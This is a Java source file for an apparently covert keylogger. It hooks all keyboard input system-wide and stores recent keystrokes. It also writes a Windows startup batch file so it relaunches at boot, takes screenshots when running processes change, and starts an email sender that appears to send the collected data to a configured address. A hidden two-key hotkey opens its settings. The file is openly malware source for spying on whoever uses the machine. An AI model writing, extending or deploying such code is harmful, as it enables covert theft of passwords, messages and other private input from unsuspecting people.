package keylogger;

import constants.Constants;
import email.EmailSender;
import models.Email;
import models.Settings;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import utils.ActiveProcess;
import utils.FileUtil;
import utils.LoadSettings;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

public class Keylogger implements NativeKeyListener {

    private static final String OS = System.getProperty("os.name").toLowerCase();
    private int lastNumberOfActiveProcess = 0;
    private final List<String> last100Keys;
    private Logger logger = null;
    private FileHandler fileHandler = null;
    private static final Keylogger log = new Keylogger();
    private boolean isWork;
    private final Settings settings = LoadSettings.loadSettings() == null ? LoadSettings.createDefaultSettings() : LoadSettings.loadSettings();
    private final Email email = LoadSettings.loadSettingsForEmail() == null ? LoadSettings.createDefaultEmail() : LoadSettings.loadSettingsForEmail();

    private Keylogger() {
        this.last100Keys = new ArrayList<>();
        FileUtil.createDirectory(Constants.LOG_FOLDER_NAME);
        createStartUpFile();
        try {
            logger = Logger.getLogger("Key Log");
            fileHandler = new FileHandler(Constants.LOG_FILE_PATH);
            logger.addHandler(fileHandler);
            SimpleFormatter simpleFormatter = new SimpleFormatter();
            fileHandler.setFormatter(simpleFormatter);

            Timer t = new Timer();
            t.schedule(new TimerTask() {
                @Override
                public void run() {
                    int numberOfActiveProcess = ActiveProcess.getActiveProcess().size();
                    if (numberOfActiveProcess != lastNumberOfActiveProcess) {
                        lastNumberOfActiveProcess = numberOfActiveProcess;
                        if (isWork) {
                            ScreenCapture.start();
                            if (settings != null) {
                                if (settings.getEmail() != null && !settings.getEmail().equals("")) {
                                    if (new SimpleDateFormat("dd-MM-yyyy").format(new Date()).equals(Objects.requireNonNull(email).getDate())) {
                                        if (!email.isSent()) {
                                            EmailSender emailSender = new EmailSender();
                                            emailSender.start(settings);
                                        }
                                    }
                                }
                            }

                        }
                    }
                }
            }, 0, 1);
        } catch (IOException | SecurityException e) {
            utils.Logger.insertLog(e);
        }
    }

    public static Keylogger getInstance() {
        return log;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if (last100Keys.size() > 1) {
            if (last100Keys.get(last100Keys.size() - 1).equals(Objects.requireNonNull(settings).getFrstKey()) && last100Keys.get(last100Keys.size() - 2).equals(settings.getSecondKey())) {
                FirstTime.checkIfSettingsExist();
                if (last100Keys.size() > 100) {
                    last100Keys.clear();
                }
            }
        }
        last100Keys.add(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        if (Constants.TURN_ON_DEBUGG)
            logger.log(Level.INFO, "Key pressed: {0}", NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

    public void start() {
        try {
            fileHandler = new FileHandler(Constants.LOG_FILE_PATH);
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(Keylogger.getInstance());
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            isWork = true;
        } catch (NativeHookException e) {
            utils.Logger.insertLog(e);
            isWork = false;
        } catch (IOException | SecurityException e) {
            utils.Logger.insertLog(e);
        }
    }

    public void stop() {
        if (GlobalScreen.isNativeHookRegistered()) {
            try {
                fileHandler.close();
                GlobalScreen.unregisterNativeHook();
                isWork = false;
            } catch (NativeHookException e) {
                utils.Logger.insertLog(e);
            }
        }
    }

    public boolean isWork() {
        return isWork;
    }

    private void createStartUpFile() {
        if (isWindows()) {
            SetStartUpWindows.createBatFile();
        } else if (isMac()) {
            System.out.println("This is Mac");
        } else if (isUnix()) {
            System.out.println("This is Unix or Linux");
        } else if (isSolaris()) {
            System.out.println("This is Solaris");
        } else {
            System.out.println("Your OS is not support!!");
        }
    }

    private static boolean isWindows() {
        return (OS.contains("win"));
    }

    private static boolean isMac() {
        return (OS.contains("mac"));
    }

    private static boolean isUnix() {
        return (OS.contains("nix") || OS.contains("nux") || OS.indexOf("aix") > 0);
    }

    private static boolean isSolaris() {
        return (OS.contains("sunos"));
    }
}
